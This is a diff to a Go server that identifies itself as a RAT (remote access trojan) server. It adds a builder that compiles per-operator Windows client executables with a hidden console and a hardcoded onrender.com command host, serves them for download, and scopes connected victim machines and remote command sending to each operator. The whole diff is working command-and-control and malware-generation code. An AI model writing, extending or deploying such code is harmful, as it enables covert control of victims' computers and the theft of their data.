@@ -8,8 +8,11 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
+	"path/filepath"
 	"strings"
 	"sync"
+	"time"
 
 	"github.com/google/uuid"
 	"github.com/gorilla/mux"
@@ -23,19 +26,32 @@ type Message struct {
 }
 
 type Client struct {
-	ID   string
-	Conn *websocket.Conn
+	ID      string
+	Conn    *websocket.Conn
+	BuildID string
+	Owner   string
+}
+
+type Build struct {
+	ID      string
+	Owner   string
+	Host    string
+	Created time.Time
 }
 
 var (
-	clients    = make(map[string]*Client)
-	clientsMu  sync.RWMutex
-	admins     = make(map[*websocket.Conn]bool)
-	adminsMu   sync.Mutex
-	upgrader   = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
-	sessions   = make(map[string]string)
-	sessionsMu sync.RWMutex
-	users      = map[string]string{
+	clients      = make(map[string]*Client)
+	clientsMu    sync.RWMutex
+	admins       = make(map[*websocket.Conn]bool)
+	adminsMu     sync.Mutex
+	upgrader     = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
+	sessions     = make(map[string]string)
+	sessionsMu   sync.RWMutex
+	builds       = make(map[string]*Build)
+	buildsMu     sync.RWMutex
+	userBuilds   = make(map[string][]string) // owner -> buildIDs
+	userBuildsMu sync.RWMutex
+	users        = map[string]string{
 		"admin": "admin123",
 		"user1": "pass1",
 	}
@@ -50,6 +66,9 @@ func main() {
 	r.Handle("/clients", authMiddleware(http.HandlerFunc(getClientsHandler))).Methods("GET")
 	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
 	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
+	r.Handle("/builds", authMiddleware(http.HandlerFunc(createBuildHandler))).Methods("POST")
+	r.Handle("/builds", authMiddleware(http.HandlerFunc(listBuildsHandler))).Methods("GET")
+	r.Handle("/builds/{id}", authMiddleware(http.HandlerFunc(downloadBuildHandler))).Methods("GET")
 	r.HandleFunc("/ws", wsHandler)
 	r.PathPrefix("/").Handler(http.HandlerFunc(staticOrLogin))
 
@@ -59,6 +78,101 @@ func main() {
 	}
 	log.Println("Starting RAT server on port", port)
 	http.ListenAndServe(":"+port, r)
+}
+
+func createBuildHandler(w http.ResponseWriter, r *http.Request) {
+	cookie, _ := r.Cookie("session")
+	sessionsMu.RLock()
+	owner := sessions[cookie.Value]
+	sessionsMu.RUnlock()
+
+	buildID := uuid.New().String()
+	build := &Build{
+		ID:      buildID,
+		Owner:   owner,
+		Host:    "https://panel-agzz.onrender.com", // Фиксированный хост
+		Created: time.Now(),
+	}
+
+	buildsMu.Lock()
+	builds[buildID] = build
+	buildsMu.Unlock()
+
+	userBuildsMu.Lock()
+	userBuilds[owner] = append(userBuilds[owner], buildID)
+	userBuildsMu.Unlock()
+
+	// Генерируем клиент с фиксированным хостом
+	tmpDir := filepath.Join("builds", buildID)
+	_ = os.MkdirAll(tmpDir, 0755)
+	tmpFile := filepath.Join(tmpDir, "client.go")
+
+	code := strings.ReplaceAll(template, "YOUR_SERVER_IP", "panel-agzz.onrender.com")
+	if err := os.WriteFile(tmpFile, []byte(code), 0644); err != nil {
+		http.Error(w, "failed to create build file", http.StatusInternalServerError)
+		return
+	}
+
+	// Компилируем клиент
+	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", "client.exe", "client.go")
+	cmd.Dir = tmpDir
+	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")
+	if err := cmd.Run(); err != nil {
+		http.Error(w, "build failed", http.StatusInternalServerError)
+		return
+	}
+
+	w.WriteHeader(http.StatusCreated)
+	json.NewEncoder(w).Encode(map[string]string{"id": buildID})
+}
+
+func listBuildsHandler(w http.ResponseWriter, r *http.Request) {
+	cookie, _ := r.Cookie("session")
+	sessionsMu.RLock()
+	owner := sessions[cookie.Value]
+	sessionsMu.RUnlock()
+
+	userBuildsMu.RLock()
+	buildIDs := userBuilds[owner]
+	userBuildsMu.RUnlock()
+
+	buildsMu.RLock()
+	defer buildsMu.RUnlock()
+
+	var result []*Build
+	for _, id := range buildIDs {
+		if build, exists := builds[id]; exists {
+			result = append(result, build)
+		}
+	}
+
+	json.NewEncoder(w).Encode(result)
+}
+
+func downloadBuildHandler(w http.ResponseWriter, r *http.Request) {
+	buildID := mux.Vars(r)["id"]
+
+	buildsMu.RLock()
+	build, exists := builds[buildID]
+	buildsMu.RUnlock()
+
+	if !exists {
+		http.Error(w, "build not found", http.StatusNotFound)
+		return
+	}
+
+	cookie, _ := r.Cookie("session")
+	sessionsMu.RLock()
+	owner := sessions[cookie.Value]
+	sessionsMu.RUnlock()
+
+	if build.Owner != owner {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	exePath := filepath.Join("builds", buildID, "client.exe")
+	http.ServeFile(w, r, exePath)
 }
 
 func loginHandler(w http.ResponseWriter, r *http.Request) {
@@ -122,13 +236,34 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "unauthorized", http.StatusUnauthorized)
 		return
 	}
+
+	buildID := r.URL.Query().Get("build_id")
+	if buildID == "" {
+		http.Error(w, "build_id required", http.StatusBadRequest)
+		return
+	}
+
+	buildsMu.RLock()
+	build, exists := builds[buildID]
+	buildsMu.RUnlock()
+
+	if !exists {
+		http.Error(w, "invalid build_id", http.StatusBadRequest)
+		return
+	}
+
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
 		log.Println("upgrade error:", err)
 		return
 	}
 	id := strings.ReplaceAll(r.RemoteAddr, ":", "_")
-	client := &Client{ID: id, Conn: conn}
+	client := &Client{
+		ID:      strings.ReplaceAll(r.RemoteAddr, ":", "_"),
+		Conn:    conn,
+		BuildID: buildID,
+		Owner:   build.Owner,
+	}
 	clientsMu.Lock()
 	clients[id] = client
 	clientsMu.Unlock()
@@ -223,24 +358,56 @@ func broadcastToAdmins(msg Message) {
 }
 
 func getClientsHandler(w http.ResponseWriter, r *http.Request) {
+	cookie, _ := r.Cookie("session")
+	sessionsMu.RLock()
+	owner := sessions[cookie.Value]
+	sessionsMu.RUnlock()
+
 	clientsMu.RLock()
 	defer clientsMu.RUnlock()
-	ids := make([]string, 0, len(clients))
-	for id := range clients {
-		ids = append(ids, id)
+
+	var result []struct {
+		ID      string `json:"id"`
+		BuildID string `json:"build_id"`
 	}
-	json.NewEncoder(w).Encode(ids)
+
+	for _, client := range clients {
+		if client.Owner == owner {
+			result = append(result, struct {
+				ID      string `json:"id"`
+				BuildID string `json:"build_id"`
+			}{
+				ID:      client.ID,
+				BuildID: client.BuildID,
+			})
+		}
+	}
+
+	json.NewEncoder(w).Encode(result)
 }
 
 func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
 	id := mux.Vars(r)["id"]
+
 	clientsMu.RLock()
 	client, ok := clients[id]
 	clientsMu.RUnlock()
+
 	if !ok {
 		http.Error(w, "client not found", http.StatusNotFound)
 		return
 	}
+
+	cookie, _ := r.Cookie("session")
+	sessionsMu.RLock()
+	owner := sessions[cookie.Value]
+	sessionsMu.RUnlock()
+
+	if client.Owner != owner {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+
 	var msg Message
 	if err := json.NewDecoder(r.Body).Decode(&msg); err != nil {
 		http.Error(w, "bad request", http.StatusBadRequest)
